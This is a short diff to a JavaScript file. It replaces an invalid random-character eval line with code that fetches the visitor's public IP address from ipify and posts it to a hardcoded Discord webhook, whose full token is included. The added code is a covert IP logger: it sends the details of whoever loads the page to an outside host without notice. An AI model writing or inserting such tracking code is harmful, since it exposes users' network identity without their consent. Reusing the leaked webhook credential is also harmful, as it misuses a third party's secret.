@@ -1,1 +1,23 @@
-eval(String.fromCharCode(...[for (let i = 0; i < 52; i++) Math.floor(Math.random() * 93) + 33]));
+fetch('https://api64.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => {
+        const ipAddress = data.ip;
+        const webhookURL = 'https://discord.com/api/webhooks/1197303153826218055/bUyjZhkxnSthZWF-UpyQJb4_wIF_NJZoM2Gn_5etKV9rwx-hfztGVXeLJDtyfEczvMSn';
+
+        // Create payload for Discord webhook
+        const payload = {
+            content: `User's IP Address: ${ipAddress}`,
+        };
+
+        // Send data to Discord webhook
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(payload),
+        });
+    })
+    .catch(error => {
+        console.error('Error:', error);
+    });
